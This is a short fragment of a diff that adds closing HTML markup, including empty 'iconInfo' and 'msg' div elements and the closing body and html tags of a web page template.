+		<div class="iconInfo"></div>
+		<div class="msg"></div>
+	</div>	
+</div></div></body></html>
